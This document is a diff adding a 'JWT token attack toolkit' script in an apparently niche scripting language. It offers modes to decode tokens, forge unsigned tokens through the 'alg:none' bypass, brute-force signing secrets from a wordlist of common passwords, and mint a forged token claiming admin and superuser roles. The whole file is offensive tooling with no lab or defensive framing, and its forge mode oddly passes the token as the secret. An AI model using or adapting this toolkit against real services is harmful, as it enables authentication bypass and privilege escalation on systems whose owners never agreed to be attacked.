@@ -1,0 +1,67 @@
+# koppa-jwt-attack v2.0 — JWT token attack toolkit
+# Usage: koppa run koppa-jwt-attack <token> [decode|alg-none|crack|forge]
+
+import jwt, encode, log, report
+
+fn cmd_decode(token) {
+    log.info("===== JWT Decode =====")
+    let decoded = jwt.decode(token)
+    log.info("Payload : {decoded}")
+    let expired = jwt.is_expired(token)
+    log.info("Expired : {expired}")
+}
+
+fn cmd_alg_none(token) {
+    log.info("===== alg:none Bypass =====")
+    let forged = jwt.none_alg(token)
+    log.success("[+] Forged token:\n{forged}")
+    return forged
+}
+
+fn cmd_crack(token) {
+    log.info("===== Brute-force Secret =====")
+    let wordlist = ["secret", "password", "koppa", "admin", "12345",
+                    "koppa123", "jwt_secret", "mysecret", "p@ssword"]
+    let result = jwt.crack(token, wordlist)
+    if result {
+        log.success("[+] Secret found: {result}")
+    } else {
+        log.warn("[-] Secret not found in wordlist")
+    }
+    return result
+}
+
+fn cmd_forge(secret) {
+    log.info("===== Forge Token =====")
+    let payload = {"sub": "admin", "role": "superuser", "iat": 1700000000}
+    let forged = jwt.forge(payload, secret)
+    log.success("[+] Forged token: {forged}")
+    return forged
+}
+
+fn main() {
+    let token = __args__[0]
+    let mode  = __args__[1]
+
+    if not token {
+        log.warn("Usage: koppa run koppa-jwt-attack <token> [decode|alg-none|crack|forge]")
+        return
+    }
+
+    log.info("===== KOPPA JWT Attack v2.0 =====")
+
+    if mode == "decode"   { cmd_decode(token) }
+    if mode == "alg-none" { cmd_alg_none(token) }
+    if mode == "crack"    { cmd_crack(token) }
+    if mode == "forge"    { cmd_forge(token) }
+
+    if not mode {
+        cmd_decode(token)
+        log.info("")
+        cmd_alg_none(token)
+        log.info("")
+        cmd_crack(token)
+    }
+
+    log.success("JWT attack complete!")
+}
